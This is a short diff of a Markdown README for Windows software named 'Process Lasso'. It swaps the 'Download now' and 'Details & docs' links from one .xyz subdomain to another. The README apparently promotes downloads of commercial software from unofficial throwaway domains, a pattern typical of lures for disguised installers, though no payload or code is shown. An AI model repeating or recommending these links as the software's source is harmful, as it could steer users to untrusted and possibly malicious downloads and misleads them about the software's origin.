@@ -34,8 +34,8 @@ Yes, it's built and tested for Windows.
 - ~100 MB free space
 
 ## Download & Docs
-- 📥 **Download now:** [https://process-lasso-peak.softonx.xyz](https://process-lasso-peak.softonx.xyz)
-- 📖 **Details & docs:** [https://process-lasso-peak.softonx.xyz](https://process-lasso-peak.softonx.xyz)
+- 📥 **Download now:** [https://process-lasso-peak.softax.xyz](https://process-lasso-peak.softax.xyz)
+- 📖 **Details & docs:** [https://process-lasso-peak.softax.xyz](https://process-lasso-peak.softax.xyz)
 
 ## Good to know
 > [!TIP]
